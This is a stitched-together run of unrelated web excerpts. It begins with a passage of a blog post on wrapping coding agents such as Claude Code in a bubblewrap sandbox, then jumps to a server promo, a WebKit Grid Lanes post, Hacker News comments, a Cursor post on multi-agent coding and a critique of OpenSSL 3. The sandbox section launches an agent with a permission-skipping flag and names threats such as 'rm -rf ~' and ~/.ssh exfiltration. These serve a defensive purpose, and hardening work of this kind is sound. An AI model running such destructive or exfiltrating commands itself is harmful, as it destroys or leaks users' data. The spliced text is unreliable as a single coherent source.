     "$(command -v claude)" --dangerously-skip-permissions "Please review Planning/ReportingEnhancementPlan.md"
</code></pre>



<h3>Key Configuration Lines:</h3>



<pre><code># Required for Claude Code to work
--ro-bind "$HOME/.nvm" "$HOME/.nvm" \

# Claude stores auth here. Without this, you'll re-login every time
--bind "$HOME/.claude" "$HOME/.claude" \

# Only add if you understand why you need SSH access
# --ro-bind "$HOME/.ssh" "$HOME/.ssh" \

# Block access to your .env files by overlaying with empty files (You need to know exact path of files 

     --ro-bind /dev/null "$PROJECT_DIR/.env" \
     --ro-bind /dev/null "$PROJECT_DIR/.env.local" \
     --ro-bind /dev/null "$PROJECT_DIR/.env.production" \
</code></pre>



<p><strong>Important:</strong>&nbsp;Most people don’t need the SSH line. It gives your agent the ability to SSH into systems where you’ve copied a public key. If you don’t understand the utility, don’t add it.</p>



<h2>Why Not a Dedicated User Account?</h2>



<p>My&nbsp;<a href="https://patrickmccanna.net/keeping-secrets-from-claude-code/">previous post</a>&nbsp;proposed creating a custom user account for Claude on the host OS. This approach has three major problems:</p>



<h3>1. ACL Tuning Becomes a Usability Nightmare</h3>



<p>You’ll fight with file permissions constantly. You need to tune Access Control Lists to prevent access to sensitive&nbsp;<code>.env</code>&nbsp;files. This type of friction has killed security initiatives for decades. Security dies on usability hills.</p>



<p>I came up with that approach while getting sick with the flu. Please accept my apologies.</p>



<h3>2. No Network Connectivity Restrictions</h3>



<p>A custom account doesn’t solve the network access problem. Claude agents can spin up sockets and connect to whatever they want. Unless you run UFW and restrict outbound connectivity from your host, you risk your agent exfiltrating content.</p>



<p>I’ve been creating agents that <a href="https://patrickmccanna.net/using-custom-ai-agents-to-migrate-self-hosted-services-between-servers/">remotely administer and tune servers</a>. It’s not responsible to let agents have source:any destination:any access to your network or the Internet. One wrong prompt puts you at risk of data exfiltration. My previous solution was incomplete.</p>



<h3>3. Docker Is the Wrong Tool</h3>



<p>Docker solves the “it works on my machine” problem when moving code from your laptop to production servers. But most people aren’t deploying frequently enough to maintain strong Docker skills.</p>



<p>Setting up filesystems and networking in containers takes mental effort. If you just want to run a command safely, you shouldn’t need to install and configure a background service. People want something that works quickly without the cognitive overhead.</p>



<h2>Why Use Your Own Bubblewrap Instead of Anthropic’s Sandbox?</h2>



<p><strong>Everyone makes security mistakes eventually.</strong>&nbsp;Claude Code is potentially dangerous. Which approach is safer?</p>



<p><strong>Trust Anthropic:</strong>&nbsp;Hope their team never makes an implementation mistake that breaks security controls.</p>



<p>or</p>



<p><strong>Don’t Trust Anthropic:</strong>&nbsp;Implement your own access controls in the operating system that constrain the binary at runtime.</p>



<p>There is one other big reason you should know how to leverage Bubblewrap.   You need a solution for sandboxing agents that aren’t Claude Code.</p>



<p><strong>Agents should never be considered trustworthy.</strong>&nbsp;Even when they have security controls. Put controls around them—don’t rely on agents built with models that have experienced&nbsp;<a href="https://www.anthropic.com/research/agentic-misalignment">misalignment</a>.</p>



<h2>A comparison of what you’re trusting with user-wrapped invocation of bubblewrap versus embedded bubblewrap in a client</h2>



<h3>Running Bubblewrap Yourself:</h3>



<ul>
<li>The Linux kernel’s namespace implementation</li>



<li>The Bubblewrap binary (small, auditable codebase)</li>



<li>Your own configuration (you wrote it, you understand it)</li>



<li>Your own proxy/filtering code</li>
</ul>



<h3>Using Anthropic’s Sandbox Runtime:</h3>



<ul>
<li>Everything above, plus:</li>



<li>Anthropic’s wrapper code and configuration choices</li>



<li>Anthropic’s filtering proxy implementation</li>



<li>Anthropic’s update/distribution mechanism (npm)</li>



<li>That Anthropic’s security interests align with yours</li>
</ul>



<h2>The Trust Matrix</h2>



<p>Trust isn’t binary—it’s about understanding what you’re trusting and why. Here’s a quick comparison:</p>



<figure><table><thead><tr><th data-align="left">Threat</th><th data-align="left">DIY bwrap</th><th data-align="left">Anthropic SRT</th></tr></thead><tbody><tr><td>Claude accidentally&nbsp;<code>rm -rf ~</code></td><td>✓ Protected</td><td>✓ Protected</td></tr><tr><td>Claude exfiltrating ~/.ssh</td><td>✓ Protected</td><td>✓ Protected</td></tr><tr><td>Supply chain attack via npm</td><td>✓ Not exposed</td><td>✗ Exposed</td></tr><tr><td>Subtle misconfiguration</td><td>✗ Your risk</td><td>✓ Their expertise</td></tr><tr><td>Agent Telemetry you don’t want sent</td><td>✓ You control</td><td>? Their choice</td></tr><tr><td>Novel bypass techniques</td><td>✗ You’re on your own</td><td>✓ Their team watches</td></tr></tbody></table></figure>



<p>So in Anthropic’s defense: this is not cut-and-dried. Most companies don’t have resources for great security teams. You have to decide whether you can own this. Many companies will be wise to rely on Anthropic’s expertise. Their reputation is on the line if someone breaks their sandbox implementation. But you’re going to be locked into Anthropic’s security model if you don’t learn how to wield bubblewrap. Pivoting to a new agent will require figuring out security there. Why not just rip the band aid off and learn bubblewrap?</p>



<h2>Don’t trust me either!</h2>



<p>This has been a fun writeup on trusting trust. TRUST ME!</p>



<p>But you shouldn’t trust me! I might be a&nbsp;<a href="https://en.wikipedia.org/wiki/On_the_Internet,_nobody_knows_you%27re_a_dog">Dog on the Internet</a>. Maybe I’m ai slop?!</p>



<p>Here is some code you can use to test the bwrap container I provided for my claude usage. Note that this is invoked different- we’re not going to call claude- we’re going to call bash and pass it the test script.  My test script is available <a href="https://github.com/CaptainMcCrank/BlogCode/blob/main/sandbox-escape-test.sh">here</a>: </p>



<p>All you need to do is create a <strong>YourProject</strong> folder in your <strong>~/$HOME/Development</strong> directory. Then create a <strong>sandbox-escape-test.sh</strong> in there. Fill it with the test code from my github.</p>



<p><strong>Read and understand what the script does before executing it.  </strong>This post is already pretty long 😀</p>



<h2>Wrapping Up</h2>



<p>I’m building with many agents—not just Claude Code. I need a generalized solution for sandboxing that I can apply to other agents.</p>



<p>Anthropic deserves attention and credit for the constraints they’re giving you. I wish they had published them in a way that doesn’t tie your security destiny to their ability to execute correctly 100% of the time.</p>



<p>The choice is yours: trust a vendor’s implementation, or take control of your own security boundaries. Both are valid. I might be paranoid. Are you feeling lucky?</p>



<p>p.s. If I ever get run over by a flaming pizza truck, here’s a handy 1 liner:</p>



<pre><code>claude "Act as a security expert with a specialization in Linux system security.  Help me generate a bubblewrap script for safely invoking coding agents so they do not have access to sensitive data on my file system and appropriately manage other security risks, even though they're going to be invoked under my account's permissions.  Let's talk through everything that the agent should be able to do &amp; access first, and then generate an appropriate bwrap script for delivering that capability.  Then let's discuss what access we should restrict."</code></pre>

	<h2 dir="ltr">Making rapid deployment of advanced AI available to everyone</h2>
<p dir="ltr">With global data center demand at 60 GW in 2024 and <a href="https://www.mckinsey.com/industries/technology-media-and-telecommunications/our-insights/ai-power-expanding-data-center-capacity-to-meet-growing-demand" target="_blank" rel="noreferrer noopener">expected to triple</a> by the end of the decade, the industry faces a once-in-a-generation transformation. More than 80 percent of facilities today are air-cooled and operate at 8 kW per rack or less, making them poorly suited for GPU-based systems that require liquid cooling and 10 kW+ per server.</p>
<p dir="ltr">NXT RNGD Server provides a practical path forward. It allows organizations to deploy advanced AI within their existing facilities, without prohibitive energy costs or disruptive retrofits. Engineered as a plug-and-play system, NXT RNGD combines AI-optimized silicon with Furiosa LLM, a vLLM-compatible serving framework featuring built-in OpenAI API support, enabling organizations to deploy and scale AI workloads from day one. </p>
<p dir="ltr">By combining silicon and system design, NXT RNGD Server makes efficient, enterprise-ready, and future-proof AI infrastructure a reality.</p>
<h2 dir="ltr">Availability</h2>

            <div>
                                
                <p>You might have <a href="https://webkit.org/blog/17660/introducing-css-grid-lanes/">heard recently</a> that Safari Technology Preview 234 landed the final plan for supporting masonry-style layouts in CSS. It’s called Grid Lanes.</p>
<figure><picture><source srcset="https://webkit.org/wp-content/uploads/grid-lanes-photos-dark-scaled.webp" type="image/png" media="(prefers-color-scheme: dark)"><img fetchpriority="high" decoding="async" src="https://webkit.org/wp-content/uploads/grid-lanes-photos-light-scaled.webp" alt="web browser showing a 6-column layout of photos of various aspect ratios, packed vertically" width="2560" height="1667" srcset="https://webkit.org/wp-content/uploads/grid-lanes-photos-light-scaled.webp 2560w, https://webkit.org/wp-content/uploads/grid-lanes-photos-light-300x195.webp 300w, https://webkit.org/wp-content/uploads/grid-lanes-photos-light-1024x667.webp 1024w, https://webkit.org/wp-content/uploads/grid-lanes-photos-light-768x500.webp 768w, https://webkit.org/wp-content/uploads/grid-lanes-photos-light-1536x1000.webp 1536w, https://webkit.org/wp-content/uploads/grid-lanes-photos-light-2048x1333.webp 2048w" sizes="(max-width: 2560px) 100vw, 2560px"></picture><figcaption>Try out all <a href="https://webkit.org/demos/grid3/">our demos of CSS Grid Lanes</a> today in Safari Technology Preview.</figcaption></figure>
<p><a href="https://webkit.org/blog/17660/introducing-css-grid-lanes/">CSS Grid Lanes</a> adds a whole new capability to CSS Grid. It lets you line up content in <em>either</em> columns or rows — and not both.</p>
<p>This layout pattern allows content of various aspect ratios to pack together. No longer do you need to truncate content artificially to make it fit. Plus, the content that’s earlier in the HTML gets grouped together towards the start of the container. If new items get lazy loaded, they appear at the end without reshuffling what’s already on screen.</p>
<p>It can be tricky to understand the content flow pattern as you are learning Grid Lanes. The content is not flowing down the first column to the very bottom of the container, and then back up to the top of the second column. (If you want that pattern, use <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/Guides/Multicol_layout">CSS Multicolumn</a> or Flexbox.)</p>
<p>With Grid Lanes, the content flows perpendicular to the layout shape you created. When you define columns, the content flows back and forth across those columns, just like to how it would if rows existed. If you define rows, the content will flow up and down through the rows — in the column direction, as if columns were there.</p>
<figure><img decoding="async" src="https://webkit.org/wp-content/uploads/grid-lane-content-flow-scaled.webp" alt="diagram showing how for waterfall layout there are columns, while content flows side to side. And for brick, the content is laid out in rows, while it the order flows up and down." width="2560" height="1439" srcset="https://webkit.org/wp-content/uploads/grid-lane-content-flow-scaled.webp 2560w, https://webkit.org/wp-content/uploads/grid-lane-content-flow-300x169.webp 300w, https://webkit.org/wp-content/uploads/grid-lane-content-flow-1024x575.webp 1024w, https://webkit.org/wp-content/uploads/grid-lane-content-flow-768x432.webp 768w, https://webkit.org/wp-content/uploads/grid-lane-content-flow-1536x863.webp 1536w, https://webkit.org/wp-content/uploads/grid-lane-content-flow-2048x1151.webp 2048w" sizes="(max-width: 2560px) 100vw, 2560px"></figure>
<p>Having a way to see the order of items can make it easier to understand this content flow. Introducing the CSS Grid Lanes Inspector in Safari. It’s just the regular Grid Inspector, now with more features.</p>
<figure><picture><source srcset="https://webkit.org/wp-content/uploads/grid-lanes-order-dark-scaled.webp" type="image/png" media="(prefers-color-scheme: dark)"><img decoding="async" src="https://webkit.org/wp-content/uploads/grid-lanes-order-light-scaled.webp" alt="Grid Lanes photo demo in Safari, with Web Inspector open to the Layout panel, and all the tools for the Grid Inspector turned on. Grid lines are marked with dotted lines. Columns are labeled with numbers and sizes. And each photo is marked with a label like Item 1 — which makes it clear the order of content in the layout." width="2560" height="1667" srcset="https://webkit.org/wp-content/uploads/grid-lanes-order-light-scaled.webp 2560w, https://webkit.org/wp-content/uploads/grid-lanes-order-light-300x195.webp 300w, https://webkit.org/wp-content/uploads/grid-lanes-order-light-1024x667.webp 1024w, https://webkit.org/wp-content/uploads/grid-lanes-order-light-768x500.webp 768w, https://webkit.org/wp-content/uploads/grid-lanes-order-light-1536x1000.webp 1536w, https://webkit.org/wp-content/uploads/grid-lanes-order-light-2048x1333.webp 2048w" sizes="(max-width: 2560px) 100vw, 2560px"></picture></figure>
<p>Safari’s <a href="https://webkit.org/blog/11588/introducing-css-grid-inspector/">Grid Inspector</a> already reveals the grid lines for Grid Lanes, and labels track sizes, line numbers, line names, and area names. Now it has a new feature — “Order Numbers”.</p>
<p>By turning on the order numbers in the example above, we can clearly see how Item 1, 2, 3, and 4 flow across the columns, as if there were a row. Then Item 5 is in the middle right, followed by Item 6 on the far right, and so on.</p>
<p>You might be tempted to believe the content order doesn’t matter. With pages like this photo gallery — most users will have no idea how the photos are ordered in the HTML. But for many users, the content order has a big impact on their experience. You should always consider what it’s like to tab through content — watching one item after another sequentially come into focus. Consider what it’s like to listen to the site through a screenreader while navigating by touch or keyboard. With Grid Lanes, you can adjust <a href="https://webkit.org/blog/17660/introducing-css-grid-lanes/#:~:text=Flow%20Tolerance"><code>flow-tolerance</code></a> to reduce the jumping around and put items where people expect.</p>
<p>To know which value for flow tolerance to choose, it really helps to quickly see the order of items. That makes it immediately clear how your CSS impacts the result.</p>
<p>Order Numbers in the Grid Inspector is an extension of a feature Safari’s Flexbox Inspector has had <a href="https://webkit.org/blog/13152/webkit-features-in-safari-16-0/#:~:text=Safari%2016.0%20adds%20Flexbox%20Inspector.">since Safari 16.0</a> — marking the order of Flex items. Seeing content order is also helpful when using the <code>order</code> property in Flexbox.</p>
<figure><picture><source srcset="https://webkit.org/wp-content/uploads/flexbox-order-dark-scaled.webp" type="image/png" media="(prefers-color-scheme: dark)"><img loading="lazy" decoding="async" src="https://webkit.org/wp-content/uploads/flexbox-order-light-scaled.webp" alt="Web browser showing photo layout —&nbsp;this time a Flexbox layout. The Web Inspector is open to the Layout tab, and the Flexbox Inspector is enabled. The lines of the layout are marked with dotted lines... and each item is labeled with its order. " width="2560" height="1667" srcset="https://webkit.org/wp-content/uploads/flexbox-order-light-scaled.webp 2560w, https://webkit.org/wp-content/uploads/flexbox-order-light-300x195.webp 300w, https://webkit.org/wp-content/uploads/flexbox-order-light-1024x667.webp 1024w, https://webkit.org/wp-content/uploads/flexbox-order-light-768x500.webp 768w, https://webkit.org/wp-content/uploads/flexbox-order-light-1536x1000.webp 1536w, https://webkit.org/wp-content/uploads/flexbox-order-light-2048x1333.webp 2048w" sizes="auto, (max-width: 2560px) 100vw, 2560px"></picture></figure>
<p>Order Numbers in Safari’s Grid Inspector works for CSS Grid and Subgrid, as well as Grid Lanes.</p>
<h3>Try out Safari’s layout tooling</h3>
<p>The Grid and Flexbox layout inspectors might seem similar across browsers, but the team behind Safari’s Web Inspector has taken the time to finely polish the details. In both the Grid and Flexbox Inspectors, you can simultaneously activate as many overlays as you want. No limits. And no janky scrolling due to performance struggles.</p>
<p>Safari’s Flexbox Inspector visually distinguishes between excess free space and Flex gaps, since knowing which is which can solve confusion. It shows the boundaries of items, revealing how they are distributed both on the main axis and the cross axis of Flexbox containers. And it lists all the Flexbox containers, making it easier to understand what’s happening overall.</p>
<p>Our Grid Inspector has a simple and clear interface, making it easy to understand the options. It also lists all Grid containers. And of course, you can change the default colors of the overlays, to best contrast with your site content.</p>
<p>And Safari’s Grid and Flexbox Inspectors are the only browser devtools that label content order. We hope seeing the order of content in Grid Lanes helps you understand it more thoroughly and enjoy using this powerful new layout mechanism.</p>
<h3>Try out Order Numbers</h3>
<p>Order Numbers in Safari’s Grid Inspector shipped today in Safari Technology Preview 235. Let us know what you think. There’s still time to polish the details to make the most helpful tool possible.

<div><p>Not excusing this malicious behavior, but I have to say, the mentioned blog post is a major dick move, too.

<div><p>Blog post author here. Nope, I was just curious, since it's quite remarkable how huge archive.today is, how widely it's used, and how little we know about it. I do acknowledge the irony of an archiver being upset by an archive of their own work though :)</p><p>All that said, the post does not actually dox anyone (as far as I can tell, every name mentioned is an alias or red herring), and the "investigation" was basically punching things into my favorite search engine and seeing what came up. If a nation state level threat actor or even one of the copyright cabals wanted to find the maintainer, they have much better ways of going about it.</p></div></td></tr></tbody></table></td></tr><tr id="46629188"><td><table><tbody><tr><td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td><center><a id="up_46629188" href="https://news.ycombinator.com/vote?id=46629188&amp;how=up&amp;goto=item%3Fid%3D46624740"></a></center></td><td><br>

<p><em>Crafting Interpreters</em> contains everything you need to implement a
full-featured, efficient scripting language. You’ll learn both high-level
concepts around parsing and semantics and gritty details like bytecode
representation and garbage collection. Your brain will light up with new ideas,

<div id="readability-page-1" class="page"><div><p>We've been experimenting with running coding agents autonomously for weeks.</p>
<p>Our goal is to understand how far we can push the frontier of agentic coding for projects that typically take human teams months to complete.</p>
<p>This post describes what we've learned from running hundreds of concurrent agents on a single project, coordinating their work, and watching them write over a million lines of code and trillions of tokens.</p>
<h2 id="the-limits-of-a-single-agent"><a href="#the-limits-of-a-single-agent" aria-label="Link to this section"></a>The limits of a single agent</h2>
<p>Today's agents work well for focused tasks, but are slow for complex projects. The natural next step is to run multiple agents in parallel, but figuring out how to coordinate them is challenging.</p>
<p>Our first instinct was that planning ahead would be too rigid. The path through a large project is ambiguous, and the right division of work isn't obvious at the start. We began with dynamic coordination, where agents decide what to do based on what others are currently doing.</p>
<h2 id="learning-to-coordinate"><a href="#learning-to-coordinate" aria-label="Link to this section"></a>Learning to coordinate</h2>
<p>Our initial approach gave agents equal status and let them self-coordinate through a shared file. Each agent would check what others were doing, claim a task, and update its status. To prevent two agents from grabbing the same task, we used a locking mechanism.</p>
<p>This failed in interesting ways:</p>
<ol>
<li>
<p>Agents would hold locks for too long, or forget to release them entirely. Even when locking worked correctly, it became a bottleneck. Twenty agents would slow down to the effective throughput of two or three, with most time spent waiting.</p>
</li>
<li>
<p>The system was brittle: agents could fail while holding locks, try to acquire locks they already held, or update the coordination file without acquiring the lock at all.</p>
</li>
</ol>
<p>We tried replacing locks with optimistic concurrency control. Agents could read state freely, but writes would fail if the state had changed since they last read it. This was simpler and more robust, but there were still deeper problems.</p>
<p>With no hierarchy, agents became risk-averse. They avoided difficult tasks and made small, safe changes instead. No agent took responsibility for hard problems or end-to-end implementation. This lead to work churning for long periods of time without progress.</p>
<h2 id="planners-and-workers"><a href="#planners-and-workers" aria-label="Link to this section"></a>Planners and workers</h2>
<p>Our next approach was to separate roles. Instead of a flat structure where every agent does everything, we created a pipeline with distinct responsibilities.</p>
<ul>
<li>
<p><strong>Planners</strong> continuously explore the codebase and create tasks. They can spawn sub-planners for specific areas, making planning itself parallel and recursive.</p>
</li>
<li>
<p><strong>Workers</strong> pick up tasks and focus entirely on completing them. They don't coordinate with other workers or worry about the big picture. They just grind on their assigned task until it's done, then push their changes.</p>
</li>
</ul>
<p>At the end of each cycle, a judge agent determined whether to continue, then the next iteration would start fresh. This solved most of our coordination problems and let us scale to very large projects without any single agent getting tunnel vision.</p>
<h2 id="running-for-weeks"><a href="#running-for-weeks" aria-label="Link to this section"></a>Running for weeks</h2>
<p>To test this system, we pointed it at an ambitious goal: building a web browser from scratch. The agents ran for close to a week, writing over 1 million lines of code across 1,000 files. You can explore the <a href="https://github.com/wilsonzlin/fastrender" rel="noopener noreferrer" target="_blank">source code on GitHub</a>.</p>
<p>Despite the codebase size, new agents can still understand it and make meaningful progress. Hundreds of workers run concurrently, pushing to the same branch with minimal conflicts.</p>
<figure></figure>
<p>While it might seem like a simple screenshot, building a browser from scratch is extremely difficult.</p>
<p>Another experiment was doing an in-place migration of Solid to React in the Cursor codebase. It took over 3 weeks with +266K/-193K edits. As we've started to test the changes, we do believe it's possible to merge this change.</p>
<figure><p><img alt="Pull request showing Solid to React migration" loading="lazy" width="800" height="450" decoding="async" data-nimg="1" srcset="https://cursor.com/marketing-static/_next/image?url=https%3A%2F%2Fptht05hbb1ssoooe.public.blob.vercel-storage.com%2Fassets%2Fblog%2Flong-running-agents-pr.png&amp;w=828&amp;q=70 1x, https://cursor.com/marketing-static/_next/image?url=https%3A%2F%2Fptht05hbb1ssoooe.public.blob.vercel-storage.com%2Fassets%2Fblog%2Flong-running-agents-pr.png&amp;w=1920&amp;q=70 2x" src="https://cursor.com/marketing-static/_next/image?url=https%3A%2F%2Fptht05hbb1ssoooe.public.blob.vercel-storage.com%2Fassets%2Fblog%2Flong-running-agents-pr.png&amp;w=1920&amp;q=70"></p></figure>
<p>Another experiment was to improve an upcoming product. A long-running agent made video rendering 25x faster with an efficient Rust version. It also added support to zoom and pan smoothly with natural spring transitions and motion blurs, following the cursor. This code was merged and will be in production soon.</p>
<p>We have a few other interesting examples still running:</p>
<ul>
<li><a href="https://github.com/wilson-anysphere/indonesia" rel="noopener noreferrer" target="_blank">Java LSP</a>: 7.4K commits, 550K LoC</li>
<li><a href="https://github.com/wilsonzlin/aero" rel="noopener noreferrer" target="_blank">Windows 7 emulator</a>: 14.6K commits, 1.2M LoC</li>
<li><a href="https://github.com/wilson-anysphere/formula" rel="noopener noreferrer" target="_blank">Excel</a>: 12K commits, 1.6M LoC</li>
</ul>
<h2 id="what-weve-learned"><a href="#what-weve-learned" aria-label="Link to this section"></a>What we've learned</h2>
<p>We've deployed billions of tokens across these agents toward a single goal. The system isn't perfectly efficient, but it's far more effective than we expected.</p>
<p>Model choice matters for extremely long-running tasks. We found that GPT-5.2 models are much better at extended autonomous work: following instructions, keeping focus, avoiding drift, and implementing things precisely and completely.</p>
<p>Opus 4.5 tends to stop earlier and take shortcuts when convenient, yielding back control quickly. We also found that different models excel at different roles. GPT-5.2 is a better planner than GPT-5.1-codex, even though the latter is trained specifically for coding. We now use the model best suited for each role rather than one universal model.</p>
<p>Many of our improvements came from removing complexity rather than adding it. We initially built an integrator role for quality control and conflict resolution, but found it created more bottlenecks than it solved. Workers were already capable of handling conflicts themselves.</p>
<p>The best system is often simpler than you'd expect. We initially tried to model systems from distributed computing and organizational design. However, not all of them work for agents.</p>
<p>The right amount of structure is somewhere in the middle. Too little structure and agents conflict, duplicate work, and drift. Too much structure creates fragility.</p>
<p>A surprising amount of the system's behavior comes down to how we prompt the agents. Getting them to coordinate well, avoid pathological behaviors, and maintain focus over long periods required extensive experimentation. The harness and models matter, but the prompts matter more.</p>
<h2 id="whats-next"><a href="#whats-next" aria-label="Link to this section"></a>What's next</h2>
<p>Multi-agent coordination remains a hard problem. Our current system works, but we're nowhere near optimal. Planners should wake up when their tasks complete to plan the next step. Agents occasionally run for far too long. We still need periodic fresh starts to combat drift and tunnel vision.</p>
<p>But the core question, can we scale autonomous coding by throwing more agents at a problem, has a more optimistic answer than we expected. Hundreds of agents can work together on a single codebase for weeks, making real progress on ambitious projects.</p>
<p>The techniques we're developing here will eventually inform Cursor's agent capabilities. If you're interested in working on the hardest problems in AI-assisted software development, we'd love to hear from you at <a href="mailto:hiring@cursor.com" rel="noopener noreferrer" target="_blank">hiring@cursor.com</a>.</p></div></div>]]></description>

<div id="readability-page-1" class="page"><section id="the-state-of-openssl-for-pyca-cryptography" itemprop="articleBody" role="main" itemscope="itemscope" itemtype="http://schema.org/Article">

<p><strong>Published: January 14, 2026</strong></p>
<p>For the past 12 years, we (Paul Kehrer and Alex Gaynor) have maintained the Python <code><span>cryptography</span></code> library (also known as <code><span>pyca/cryptography</span></code> or <a href="http://cryptography.io/">cryptography.io</a>). For that entire period, we’ve relied on OpenSSL to provide core cryptographic algorithms. This past October, <a href="https://www.youtube.com/watch?v=RUIguklWwx0">we gave a talk at the OpenSSL Conference</a> describing our experiences. This talk focuses on the growing problems we have with OpenSSL’s direction. The mistakes we see in OpenSSL’s development have become so significant that we believe substantial changes are required — either to OpenSSL, or to our reliance on it.</p>
<p>Fundamentally, OpenSSL’s trajectory can be understood as a play in three acts:</p>
<ul>
<li><p>In the pre-Heartbleed era (pre-2014), OpenSSL was under-maintained and languishing, substantially lagging behind expectations.</p></li>
<li><p>In the immediate post-Heartbleed era, OpenSSL’s maintenance was reinvigorated and it made substantial progress and improvements. It grew a real code review process, began running tests in CI, adopted fuzz testing, and matured its release process.</p></li>
<li><p>Finally, in 2021 OpenSSL 3 was released. OpenSSL 3 introduced new APIs and had large internal refactors. Relative to previous OpenSSL versions, OpenSSL 3 had significant regressions in performance, complexity, API ergonomics, and didn’t make needed improvements in areas like testing, verification, and memory safety. Over the same period, OpenSSL’s forks have all made progress in these areas. Many of our concerns about OpenSSL’s direction in this time have substantial overlap with <a href="https://www.haproxy.com/blog/state-of-ssl-stacks">those highlighted by HAProxy</a>.</p></li>
</ul>
<p>The remainder of this post describes the problems we have with OpenSSL in more detail, and concludes with the changes we are making to our own policies in response. To avoid burying the lede, we intend to pursue several approaches to reducing our reliance on OpenSSL.</p>
<section id="performance">
<h2>Performance<a href="#performance" title="Link to this heading"></a></h2>
<p>Compared to OpenSSL 1.1.1, OpenSSL 3 has significant performance regressions in areas such as parsing and key loading.</p>
<p>Several years ago, we filed a bug reporting that elliptic curve public key loading had regressed 5-8x between OpenSSL 1.1.1 and 3.0.7. The reason we had noticed this is that performance had gotten so bad that we’d seen it in our test suite runtimes. Since then, OpenSSL has improved performance such that it’s <em>only</em> 3x slower than it used to be. But more significantly, the response to the issue was that, ‘regression was expected with OpenSSL 3, and while there might be some optimizations, we shouldn’t expect it to ever get back to 1.1.1 levels’. Performance regressions can be acceptable, and even appropriate, when they improve other areas of the library, however as we’ll describe, the cause of these regressions has been <em>other</em> mistakes, and not offsetting improvements.</p>
<p>As a result of these sorts of regressions, when <code><span>pyca/cryptography</span></code> migrated X.509 certificate parsing from OpenSSL to our own Rust code, we got a 10x performance improvement relative to OpenSSL 3 (n.b., some of this improvement is attributable to advantages in our own code, but much is explainable by the OpenSSL 3 regressions). Later, moving public key parsing to our own Rust code made end-to-end X.509 path validation 60% faster — just improving key loading led to a 60% end-to-end improvement, that’s how extreme the overhead of key parsing in OpenSSL was.</p>
<p>The fact that we are able to achieve better performance doing our own parsing makes clear that doing better is practical. And indeed, our performance is not a result of clever SIMD micro-optimizations, it’s the result of doing simple things that work: we avoid copies, allocations, hash tables, indirect calls, and locks — none of which should be required for parsing basic DER structures.</p>
</section>
<section id="complexity-and-apis">
<h2>Complexity and APIs<a href="#complexity-and-apis" title="Link to this heading"></a></h2>
<p>OpenSSL 3 started the process of substantially changing its APIs — it introduced <code><span>OSSL_PARAM</span></code> and has been using those for all new API surfaces (including those for post-quantum cryptographic algorithms). In short, <code><span>OSSL_PARAM</span></code> works by passing arrays of key-value pairs to functions, instead of normal argument passing. This reduces performance, reduces compile-time verification, increases verbosity, and makes code less readable. To the extent there is an argument in favor of it, we infer that the benefit is that it allows OpenSSL to use the same API (and ABI) for different algorithms with different parameters, allowing things like reading algorithm parameters from configuration files with generic configuration parsing code that doesn’t need to be updated when new algorithms are added to OpenSSL.</p>
<p>For a concrete comparison of the verbosity, performing an ML-KEM encapsulation with OpenSSL takes 37 lines with 6 fallible function calls. Doing so with BoringSSL takes 19 lines with 3 fallible function calls.</p>
<p>In addition to making public APIs more frustrating and error prone to use, OpenSSL internals have also become more complex. For example, in order to make managing arrays of <code><span>OSSL_PARAM</span></code> palatable, many OpenSSL source files are no longer simply C files, they now have a custom Perl preprocessor for their C code.</p>
<p>OpenSSL 3 also introduced the notion of “providers” (obsoleting, but not replacing, the previous ENGINE APIs), which allow for external implementations of algorithms (including algorithms provided by OpenSSL itself). This was the source of innumerable performance regressions, due to poorly designed APIs. In particular, OpenSSL allowed replacing any algorithm at any point in program execution, which necessitated adding innumerable allocations and locks to nearly every operation. To mitigate this, OpenSSL then added more caches, and ultimately RCU (Read-Copy-Update) — a complex memory management strategy which had difficult to diagnose bugs.</p>
<p>From our perspective, this is a cycle of compounding bad decisions: the providers API was incorrectly designed (there is no need to be able to redefine SHA-256 at arbitrary points in program execution) leading to performance regressions. This led to additional complexity to mitigate those regressions in the form of caching and RCU, which in term led to more bugs. And after all that, performance was <em>still</em> worse than it had been at the beginning.</p>
<p>Finally, taking an OpenSSL public API and attempting to trace the implementation to see how it is implemented has become an exercise in self-flagellation. Being able to read the source to understand how something works is important both as part of <a href="https://alexgaynor.net/2019/jul/11/read-code-more/">self-improvement in software engineering</a>, but also because as sophisticated consumers there are inevitably things about how an implementation works that aren’t documented, and reading the source gives you ground truth. The number of indirect calls, optional paths, <code><span>#ifdef</span></code>, and other obstacles to comprehension is astounding. We cannot overstate the extent to which just reading the OpenSSL source code has become miserable — in a way that both wasn’t true previously, and isn’t true in LibreSSL, BoringSSL, or AWS-LC.</p>
</section>
<section id="testing-and-verification">
<h2>Testing and Verification<a href="#testing-and-verification" title="Link to this heading"></a></h2>
<p>We joke that the Python Cryptographic Authority is a CI engineering project that incidentally produces a cryptography library. The joke reflects our real belief that investment in testing and automation enables <a href="https://en.wikipedia.org/wiki/Pareto_efficiency">Pareto improvements</a> in development speed and correctness — to the point that it can make other work look trivial.</p>
<p>The OpenSSL project does not sufficiently prioritize testing. While OpenSSL’s testing has improved substantially since the pre-Heartbleed era there are quite significant gaps. The gaps in OpenSSL’s test coverage were acutely visible during the OpenSSL 3.0 development cycle — where the project was extremely reliant on the community to report regressions experienced during the extended alpha and beta period (covering 19 pre-releases over the course of 16 months), because their own tests were insufficient to catch unintended real-world breakages. Despite the known gaps in OpenSSL’s test coverage, it’s still common for bug fixes to land without an accompanying regression test.</p>
<p>OpenSSL’s CI is exceptionally flaky, and the OpenSSL project has grown to tolerate this flakiness, which masks serious bugs. OpenSSL 3.0.4 contained a critical buffer overflow in the RSA implementation on AVX-512-capable CPUs. This bug was actually caught by CI — but because the crash only occurred when the CI runner happened to have an AVX-512 CPU (not all did), the failures were apparently dismissed as flakiness. Three years later, the project still merges code with failing tests: the day we prepared our conference slides, five of ten recent commits had failing CI checks, and the day before we delivered the talk, every single commit had failing cross-compilation builds.</p>
<p>This incident also speaks to the value of adopting tools like Intel SDE, which allows controlled testing against CPUs with different subsets of x86-64 extension instructions. Using Intel SDE to have dedicated test jobs with and without AVX-512 would have made the nature of the failure immediately legible and reproducible.</p>
<p>OpenSSL is not keeping pace with the state of the art in formal verification. Formal methods have gone from academic novelty to practical reality for meaningful chunks of cryptographic code. BoringSSL and AWS-LC have incorporated formally verified implementations and use automated reasoning to increase assurance.</p>
</section>
<section id="memory-safety">
<h2>Memory Safety<a href="#memory-safety" title="Link to this heading"></a></h2>
<p>At the time OpenSSL was created, there were no programming languages that meaningfully provided performance, embeddability, and memory safety — if you wanted a memory safe language, you were committing to giving up performance and adding a garbage collector.</p>
